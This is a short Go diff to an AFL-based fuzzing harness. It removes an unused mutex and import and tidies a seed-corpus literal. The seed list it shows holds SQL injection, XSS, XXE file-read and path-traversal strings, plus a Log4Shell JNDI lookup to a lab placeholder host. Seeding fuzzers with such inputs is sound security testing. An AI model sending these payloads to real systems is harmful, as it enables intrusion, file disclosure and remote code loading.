@@ -10,7 +10,6 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
-	"sync"
 	"time"
 )
 
@@ -23,7 +22,6 @@ type Autofactory struct {
 	queueDir     string
 	aflPath      string
 	workers      int
-	mu           sync.Mutex
 }
 
 type FuzzCase struct {
@@ -102,7 +100,7 @@ func (a *Autofactory) generateSeedCorpus() error {
 		[]byte("' OR '1'='1' -- "),
 		[]byte("<script>alert(1)</script>"),
 		[]byte("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
-		[]byte{0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
+		{0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
 		[]byte("/../../../../etc/passwd"),
 		[]byte("${jndi:ldap://vesper-lab.invalid:1389/exploit}"),
 	}
